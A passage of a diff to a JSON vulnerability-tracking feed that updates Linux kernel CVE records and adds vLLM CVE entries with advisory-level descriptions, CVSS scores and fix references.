       "description": "In the Linux kernel, the following vulnerability has been resolved:\n\nBluetooth: btintel_pcie: fix TX descriptor bounds check\n\nbtintel_pcie_prepare_tx() uses tfd_index to access the TFD and data\nbuffer arrays before the index is advanced modulo txq->count. An index\nequal to txq->count is one past the end of both arrays, so reject it in\nthe bounds check.",
-      "published": "2026-10-26T14:52:02.053Z",
+      "published": "2026-10-26T15:16:48.380",
       "updated": "2026-10-26T15:16:48.380",
       "cvss": null,
       "cvss_vector": "",
       "severity": "",
       "cpes": [],
       "packages": [],
-      "vendor_products": [
-        "Linux Linux"
-      ],
+      "vendor_products": [],
       "references": [
         "https://git.kernel.org/stable/c/08704ec6d4bf69725e7815b09a9b5c7af83e255b",
-        "https://git.kernel.org/stable/c/39ab048cce70d50af48015f5f294c4cf80d6ba89",
         "https://git.kernel.org/stable/c/2669567615215d52fb306053cbcc1f53dc386158",
+        "https://git.kernel.org/stable/c/39ab048cce70d50af48015f5f294c4cf80d6ba89",
         "https://git.kernel.org/stable/c/baa53af641c9e3644e717b8dfd1b95a55a0c111b"
       ],
       "exploit_ref": false,
@@ -23037,7 +25803,6 @@
       "epss_percentile": null,
       "x_mentions": null,
       "sources": [
-        "cve.org",
         "nvd"
       ],
       "category": "vuln",
@@ -23058,24 +25823,22 @@
     {
       "id": "CVE-2026-99095",
       "aliases": [],
-      "title": "drm/vc4: drain the hangcheck timer and works on V3D unbind",
+      "title": "",
       "description": "In the Linux kernel, the following vulnerability has been resolved:\n\ndrm/vc4: drain the hangcheck timer and works on V3D unbind\n\nNothing stops the hangcheck timer that submitted jobs arm, or the\njob_done_work that the render-done interrupt queues, at teardown:\nvc4_irq_disable() cancels only overflow_mem_work, and vc4_gem_destroy()\nruns from the drm-managed release, after vc4_v3d_unbind() has already\nuninstalled the V3D interrupt and cleared vc4->v3d. A timer still armed\nby then reads V3D registers through the NULL vc4->v3d pointer, and the\nlate callbacks run on the vc4_dev embedding them after it has been\nfreed.\n\nDrain them in vc4_v3d_unbind(): shut the timer down and cancel\nreset_work before the interrupt is taken down, because its\nvc4_irq_reset() re-enables it, then flush job_done_work so that\ncompletions queued at teardown still release their jobs.\n\nThis issue was found by an in-house static analysis tool.",
-      "published": "2026-10-26T14:52:02.647Z",
+      "published": "2026-10-26T15:16:48.500",
       "updated": "2026-10-26T15:16:48.500",
       "cvss": null,
       "cvss_vector": "",
       "severity": "",
       "cpes": [],
       "packages": [],
-      "vendor_products": [
-        "Linux Linux"
-      ],
+      "vendor_products": [],
       "references": [
         "https://git.kernel.org/stable/c/17c5fa371de2d5508755cd4cd227cc8e2bb99240",
+        "https://git.kernel.org/stable/c/94cf5971b1d04c6382437387c4dc3836cc7a1437",
         "https://git.kernel.org/stable/c/a046cd60ff3f4a8c8e672b3b18902682c1f91731",
-        "https://git.kernel.org/stable/c/e61465d3e0292daebf4dbb34e0add635e2439569",
         "https://git.kernel.org/stable/c/ade226dfd28cf2fd1dce143c556d1ee77d953696",
-        "https://git.kernel.org/stable/c/94cf5971b1d04c6382437387c4dc3836cc7a1437"
+        "https://git.kernel.org/stable/c/e61465d3e0292daebf4dbb34e0add635e2439569"
       ],
       "exploit_ref": false,
       "kev": false,
@@ -23086,7 +25849,6 @@
       "epss_percentile": null,
       "x_mentions": null,
       "sources": [
-        "cve.org",
         "nvd"
       ],
       "category": "vuln",
@@ -23107,21 +25869,19 @@
     {
       "id": "CVE-2026-99096",
       "aliases": [],
-      "title": "io_uring/register: don't exempt disabled rings from task restrictions",
+      "title": "",
       "description": "In the Linux kernel, the following vulnerability has been resolved:\n\nio_uring/register: don't exempt disabled rings from task restrictions\n\nA ring created with IORING_SETUP_R_DISABLED is exempt from its register\nrestrictions until it is enabled. This lets the creator register the\nrestrictions and then enable the ring with IORING_REGISTER_ENABLE_RINGS,\nwhether or not that opcode is in the allowed set.\n\nSince commit ed82f35b926b (\"io_uring: allow registration of per-task\nrestrictions\"), a ring also inherits restrictions from the task that\ncreates it, and the same exemption applies to those. A task whose\nregister opcodes are restricted can therefore create a disabled ring,\nissue any register opcode on it, and then enable it.\n\nMark rings whose restrictions were inherited from the task, and keep\nchecking register opcodes for them while the ring is disabled. Enabling\nsuch a ring now requires IORING_REGISTER_ENABLE_RINGS to be in the\ntask's allowed set. Per-ring restrictions registered on a disabled ring\nwork as before.\n\n[axboe: amend with inheritance flag fixup]",
-      "published": "2026-10-26T14:52:03.236Z",
+      "published": "2026-10-26T15:16:48.633",
       "updated": "2026-10-26T15:16:48.633",
       "cvss": null,
       "cvss_vector": "",
       "severity": "",
       "cpes": [],
       "packages": [],
-      "vendor_products": [
-        "Linux Linux"
-      ],
+      "vendor_products": [],
       "references": [
-        "https://git.kernel.org/stable/c/f55c240192ded562386de843bfa067671d2731d5",
-        "https://git.kernel.org/stable/c/6da8f402e362b2f546e2efb7167fc9597aef6faf"
+        "https://git.kernel.org/stable/c/6da8f402e362b2f546e2efb7167fc9597aef6faf",
+        "https://git.kernel.org/stable/c/f55c240192ded562386de843bfa067671d2731d5"
       ],
       "exploit_ref": false,
       "kev": false,
@@ -23132,7 +25892,6 @@
       "epss_percentile": null,
       "x_mentions": null,
       "sources": [
-        "cve.org",
         "nvd"
       ],
       "category": "vuln",
@@ -23153,23 +25912,21 @@
     {
       "id": "CVE-2026-99097",
       "aliases": [],
-      "title": "tee: shm: reject zero-sized allocations in tee_dyn_shm_alloc_helper()",
+      "title": "",
       "description": "In the Linux kernel, the following vulnerability has been resolved:\n\ntee: shm: reject zero-sized allocations in tee_dyn_shm_alloc_helper()\n\ntee_dyn_shm_alloc_helper() derives nr_pages from a caller-supplied size\nand passes it to alloc_pages_exact() without checking it. For size == 0\nnr_pages is 0, and alloc_pages_exact(0) calls get_order(0), which is\ndocumented as undefined and returns BITS_PER_LONG - PAGE_SHIFT. The page\nallocator then trips its order > MAX_PAGE_ORDER warning and fails the\nallocation; on a panic_on_warn kernel that ends the boot.\n\nThis can be triggered by TEE_IOC_SHM_ALLOC with struct\ntee_ioctl_shm_alloc_data where size is 0.\n\nReject a zero page count, as register_shm_helper() already does for the\nregister path.",
-      "published": "2026-10-26T14:52:03.824Z",
+      "published": "2026-10-26T15:16:48.750",
       "updated": "2026-10-26T15:16:48.750",
       "cvss": null,
       "cvss_vector": "",
       "severity": "",
       "cpes": [],
       "packages": [],
-      "vendor_products": [
-        "Linux Linux"
-      ],
+      "vendor_products": [],
       "references": [
-        "https://git.kernel.org/stable/c/e5dc7af9c3a5373ee7a84959126e7dfa9e4ad50d",
         "https://git.kernel.org/stable/c/65cb86860a80ffc6af897d53f5bd4b1733bca0ec",
+        "https://git.kernel.org/stable/c/b7f925fd5226deb953c8dcdc9677d3fcc2717c00",
         "https://git.kernel.org/stable/c/c2a97703359e25ec7ef8b2b0ef32fb3982add90a",
-        "https://git.kernel.org/stable/c/b7f925fd5226deb953c8dcdc9677d3fcc2717c00"
+        "https://git.kernel.org/stable/c/e5dc7af9c3a5373ee7a84959126e7dfa9e4ad50d"
       ],
       "exploit_ref": false,
       "kev": false,
@@ -23180,7 +25937,6 @@
       "epss_percentile": null,
       "x_mentions": null,
       "sources": [
-        "cve.org",
         "nvd"
       ],
       "category": "vuln",
@@ -23201,23 +25957,21 @@
     {
       "id": "CVE-2026-99098",
       "aliases": [],
-      "title": "dm-integrity: fix buffer overflow in inline mode with large tag size",
+      "title": "",
       "description": "In the Linux kernel, the following vulnerability has been resolved:\n\ndm-integrity: fix buffer overflow in inline mode with large tag size\n\nIn inline mode, dm_integrity_check and dm_integrity_inline_recheck\ncompute the checksum of each block into an on-stack buffer of\nHASH_MAX_DIGESTSIZE bytes. integrity_sector_checksum pads its result\nwith zeroes up to the tag size, so if the tag size is larger than\nHASH_MAX_DIGESTSIZE, the padding runs past the end of the buffer. With\nCONFIG_STACKPROTECTOR the kernel panics in dm_integrity_check on the\nfirst read.\n\nEnlarge both buffers to hold MAX_TAG_SIZE bytes, as commit b93b6643e9b5\n(\"dm integrity: fix a crash with unusually large tag size\") did for\nintegrity_metadata.\n\nNote that this is not a security bug because the buffer overflow can only\nbe triggered by root.",
-      "published": "2026-10-26T14:52:04.416Z",
+      "published": "2026-10-26T15:16:48.870",
       "updated": "2026-10-26T15:16:48.870",
       "cvss": null,
       "cvss_vector": "",
       "severity": "",
       "cpes": [],
       "packages": [],
-      "vendor_products": [
-        "Linux Linux"
-      ],
+      "vendor_products": [],
       "references": [
         "https://git.kernel.org/stable/c/3c7aad85aeb9e28386672e3a009aa2e61f751b86",
         "https://git.kernel.org/stable/c/4f0ee735dc68e3e6c4dd9a666d7f7047163c4165",
-        "https://git.kernel.org/stable/c/f49cd7820cd0a96f20e1aa2708adb002124e38a7",
-        "https://git.kernel.org/stable/c/764b683a6180fd72c931c13fea98d383506a3475"
+        "https://git.kernel.org/stable/c/764b683a6180fd72c931c13fea98d383506a3475",
+        "https://git.kernel.org/stable/c/f49cd7820cd0a96f20e1aa2708adb002124e38a7"
       ],
       "exploit_ref": false,
       "kev": false,
@@ -23228,7 +25982,6 @@
       "epss_percentile": null,
       "x_mentions": null,
       "sources": [
-        "cve.org",
         "nvd"
       ],
       "category": "vuln",
@@ -23249,22 +26002,20 @@
     {
       "id": "CVE-2026-99099",
       "aliases": [],
-      "title": "x86/CPU/AMD: Fix AMD TLBI Erratum #1718",
+      "title": "",
       "description": "In the Linux kernel, the following vulnerability has been resolved:\n\nx86/CPU/AMD: Fix AMD TLBI Erratum #1718\n\nThe processor may fail to invalidate a TLB entry while executing an\nINVLPGB/TLBSYNC instruction pair.\n\nDetect the erratum and apply a software workaround when a microcode fix\nis not present.",
-      "published": "2026-10-26T14:52:04.997Z",
+      "published": "2026-10-26T15:16:48.990",
       "updated": "2026-10-26T15:16:48.990",
       "cvss": null,
       "cvss_vector": "",
       "severity": "",
       "cpes": [],
       "packages": [],
-      "vendor_products": [
-        "Linux Linux"
-      ],
+      "vendor_products": [],
       "references": [
-        "https://git.kernel.org/stable/c/e3e6779f77ab6f0a1aa80e24868d2d89f31053fe",
         "https://git.kernel.org/stable/c/098d80b04d0fe02889c332d061db968f070b83a6",
-        "https://git.kernel.org/stable/c/87db7795cbaaf636ae22ae031f4906db7bb77803"
+        "https://git.kernel.org/stable/c/87db7795cbaaf636ae22ae031f4906db7bb77803",
+        "https://git.kernel.org/stable/c/e3e6779f77ab6f0a1aa80e24868d2d89f31053fe"
       ],
       "exploit_ref": false,
       "kev": false,
@@ -23275,7 +26026,6 @@
       "epss_percentile": null,
       "x_mentions": null,
       "sources": [
-        "cve.org",
         "nvd"
       ],
       "category": "vuln",
@@ -23347,6 +26097,236 @@
       "ai_analysis": ""
     },
     {
+      "id": "CVE-2026-115911",
+      "aliases": [],
+      "title": "",
+      "description": "vLLM is an inference and serving engine for large language models. From 0.19.0 until 0.32.0, authenticated callers can supply a request chat template when no server-side --chat-template is configured, or a malicious model repository can provide a template that is compiled and rendered by tokenizer.apply_chat_template() without a wall-clock timeout, output-size limit, or iteration bound. Rendering runs in a ThreadPoolExecutor with one worker by default, so a nonterminating render can block /v1/responses and other chat-template users after the request ends, while an output-expanding render can exhaust server memory. Harmony models are not affected because they do not use this Jinja path. This issue is fixed in version 0.32.0.",
+      "published": "2026-10-26T17:17:18.753",
+      "updated": "2026-10-26T18:34:17.050",
+      "cvss": 6.5,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
+      "severity": "medium",
+      "cpes": [],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://github.com/vllm-project/vllm/commit/cff08b461e086523cee8bba5bd3c66d302625134",
+        "https://github.com/vllm-project/vllm/pull/50300",
+        "https://github.com/vllm-project/vllm/releases/tag/v0.32.0",
+        "https://github.com/vllm-project/vllm/security/advisories/GHSA-542m-9234-8gvf"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": null,
+      "epss_percentile": null,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
+      "matched": [
+        "vllm"
+      ],
+      "match_type": "keyword",
+      "tier": 3,
+      "score": 20.0,
+      "level": "low",
+      "score_breakdown": {
+        "popularity": 7.0,
+        "cvss": 13.0
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-115913",
+      "aliases": [],
+      "title": "",
+      "description": "vLLM is an inference and serving engine for large language models. Prior to 0.32.0, the Phi-4 multimodal audio encoder in phi4mm_audio.py and phi4mm_utils.py uses eager attention by default, allowing a remote client to submit one legal long audio clip that causes MultiHeadedAttention.forward_attention to materialize and retain full attention matrices in self.attn. The scaled dot-product attention branch does not materialize these matrices. The resulting quadratic GPU-memory use can cause an out-of-memory condition and terminate EngineCore for all users. This issue is fixed in version 0.32.0.",
+      "published": "2026-10-26T17:17:19.053",
+      "updated": "2026-10-26T18:34:17.050",
+      "cvss": 6.5,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
+      "severity": "medium",
+      "cpes": [],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://github.com/vllm-project/vllm/commit/3d52578e13454de0bb8352cac988347cdcc89928",
+        "https://github.com/vllm-project/vllm/pull/60614",
+        "https://github.com/vllm-project/vllm/releases/tag/v0.32.0",
+        "https://github.com/vllm-project/vllm/security/advisories/GHSA-8397-8qf6-f2gm"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": null,
+      "epss_percentile": null,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
+      "matched": [
+        "vllm"
+      ],
+      "match_type": "keyword",
+      "tier": 3,
+      "score": 20.0,
+      "level": "low",
+      "score_breakdown": {
+        "popularity": 7.0,
+        "cvss": 13.0
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-115914",
+      "aliases": [],
+      "title": "",
+      "description": "vLLM is an inference and serving engine for large language models. From 0.11.1 until 0.32.0, the DeepSeek-OCR, DeepSeek-OCR-2, and Unlimited-OCR image path allows a remote client that can reach the OpenAI-compatible API to submit a legal image whose normalized pixels sum to zero when that image is alone in its per-step encoder batch. _parse_and_validate_image_input returns no embedding, embed_multimodal propagates that value, and sanity_check_mm_encoder_outputs triggers a fatal assertion that shuts down the engine for all users. This issue is fixed in version 0.32.0.",
+      "published": "2026-10-26T18:17:38.540",
+      "updated": "2026-10-26T18:34:17.050",
+      "cvss": 6.5,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
+      "severity": "medium",
+      "cpes": [],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://github.com/vllm-project/vllm/commit/c15672cfb49152ebf65cfd188e71b84593ec5686",
+        "https://github.com/vllm-project/vllm/pull/59417",
+        "https://github.com/vllm-project/vllm/releases/tag/v0.32.0",
+        "https://github.com/vllm-project/vllm/security/advisories/GHSA-gq5q-89c7-vhvx"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": null,
+      "epss_percentile": null,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
+      "matched": [
+        "vllm"
+      ],
+      "match_type": "keyword",
+      "tier": 3,
+      "score": 20.0,
+      "level": "low",
+      "score_breakdown": {
+        "popularity": 7.0,
+        "cvss": 13.0
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-115916",
+      "aliases": [],
+      "title": "",
+      "description": "vLLM is an inference and serving engine for large language models. Prior to 0.32.0, vllm/tokenizers/hf.py computes max_token_id with an off-by-one upper bound, allowing a pre-tokenized prompt ID equal to the vocabulary size to pass validation. For a tensor-parallel size of one and an exact multiple-of-64 vocabulary, VocabParallelEmbedding.forward does not mask that value before F.embedding uses it, causing a CUDA device-side assertion and terminating the engine. This issue is fixed in version 0.32.0.",
+      "published": "2026-10-26T18:17:39.080",
+      "updated": "2026-10-26T18:34:17.050",
+      "cvss": 6.5,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
+      "severity": "medium",
+      "cpes": [],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://github.com/vllm-project/vllm/commit/37cecc8141e2dcba9dd534897a164d4baaf27229",
+        "https://github.com/vllm-project/vllm/pull/59491",
+        "https://github.com/vllm-project/vllm/releases/tag/v0.32.0",
+        "https://github.com/vllm-project/vllm/security/advisories/GHSA-q97c-p368-75c4"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": null,
+      "epss_percentile": null,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
+      "matched": [
+        "vllm"
+      ],
+      "match_type": "keyword",
+      "tier": 3,
+      "score": 20.0,
+      "level": "low",
+      "score_breakdown": {
+        "popularity": 7.0,
+        "cvss": 13.0
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-115918",
+      "aliases": [],
+      "title": "",
+      "description": "vLLM is an inference and serving engine for large language models. From 0.16.0 until 0.32.0, the /v1/responses endpoint allows an authenticated caller to place an attacker-controlled template in chat_template_kwargs[chat_template] when no server template is configured. ChatParams.get_apply_chat_template_kwargs() preserves that value without enforcing trust_request_chat_template, so the request can bypass the intended trust policy and cause CPU or memory exhaustion through Jinja rendering. This issue is fixed in version 0.32.0.",
+      "published": "2026-10-26T18:17:39.440",
+      "updated": "2026-10-26T18:34:17.050",
+      "cvss": 6.5,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
+      "severity": "medium",
+      "cpes": [],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://github.com/vllm-project/vllm/commit/cff08b461e086523cee8bba5bd3c66d302625134",
+        "https://github.com/vllm-project/vllm/pull/50300",
+        "https://github.com/vllm-project/vllm/releases/tag/v0.32.0",
+        "https://github.com/vllm-project/vllm/security/advisories/GHSA-x567-49g5-p4cf"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": null,
+      "epss_percentile": null,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
+      "matched": [
+        "vllm"
+      ],
+      "match_type": "keyword",
+      "tier": 3,
+      "score": 20.0,
+      "level": "low",
+      "score_breakdown": {
+        "popularity": 7.0,
+        "cvss": 13.0
+      },
+      "ai_analysis": ""
+    },
+    {
       "id": "CVE-2026-54711",
       "aliases": [],
       "title": "",
@@ -23387,6 +26367,53 @@
       "score_breakdown": {
         "popularity": 14.0,
         "cvss": 4.8
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-115917",
+      "aliases": [],
+      "title": "",
+      "description": "vLLM is an inference and serving engine for large language models. Prior to 0.32.0, the OpenAI-compatible server configures Starlette CORSMiddleware with allowed_origins set to a wildcard by default. A malicious web page can use a victim's browser to reach an unauthenticated vLLM server on localhost, an internal network, or a VPN, call endpoints including GET /v1/models and POST /v1/chat/completions, consume GPU resources, and read responses. Cookie-based cross-site request forgery does not apply because credentials are disabled by default, and deployments requiring bearer authentication are exposed only when the caller already has a usable token. This issue is fixed in version 0.32.0.",
+      "published": "2026-10-26T18:17:39.263",
+      "updated": "2026-10-26T18:34:17.050",
+      "cvss": 3.4,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:N/A:N",
+      "severity": "low",
+      "cpes": [],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://github.com/vllm-project/vllm/commit/fcae5c98870ff2c20659731dce7ba3a3ff0d48aa",
+        "https://github.com/vllm-project/vllm/pull/61009",
+        "https://github.com/vllm-project/vllm/releases/tag/v0.32.0",
+        "https://github.com/vllm-project/vllm/security/advisories/GHSA-vvpg-rrww-wpmh"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": null,
+      "epss_percentile": null,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
+      "matched": [
+        "vllm"
+      ],
+      "match_type": "keyword",
+      "tier": 3,
+      "score": 18.8,
+      "level": "low",
+      "score_breakdown": {
+        "popularity": 7.0,
+        "cvss": 6.8,
+        "unauth_network": 5
       },
       "ai_analysis": ""
     },
